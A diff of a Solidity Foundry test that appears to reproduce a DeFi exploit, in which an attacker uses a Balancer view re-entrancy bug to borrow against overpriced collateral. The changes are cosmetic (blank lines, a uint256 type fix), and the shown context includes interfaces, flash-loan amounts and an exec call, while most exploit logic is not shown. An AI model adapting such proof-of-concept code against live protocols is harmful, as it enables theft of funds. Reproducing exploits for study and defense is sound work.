@@ -14,10 +14,13 @@ import "./../interface.sol";
 // Attacker used view re-entrance Balancer bug to execute malicious code before pool balances were updated and steal money using overpriced collateral
 
 interface IWeightedBalancerLPOracle {
+
     function getPrice(address token) external view returns (uint256);
+
 }
 
 interface IAccountManager {
+
     function riskEngine() external;
     function openAccount(address owner) external returns (address);
     function borrow(address account, address token, uint256 amt) external;
@@ -27,13 +30,17 @@ interface IAccountManager {
     function exec(address account, address target, uint256 amt, bytes calldata data) external;
 
     function approve(address account, address token, address spender, uint256 amt) external;
+
 }
 
 interface IBalancerToken is IERC20 {
+
     function getPoolId() external view returns (bytes32);
+
 }
 
 contract ContractTest is Test {
+
     IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
@@ -77,7 +84,7 @@ contract ContractTest is Test {
         amounts[0] = 606 * 1e8;
         amounts[1] = 10_050_100 * 1e15;
         amounts[2] = 18_000_000 * 1e6;
-        uint256[] memory modes = new uint[](3);
+        uint256[] memory modes = new uint256[](3);
         modes[0] = 0;
         modes[1] = 0;
         modes[2] = 0;
@@ -227,4 +234,5 @@ contract ContractTest is Test {
         );
         AccountManager.exec(account, address(aaveV3), 0, execData);
     }
+
 }
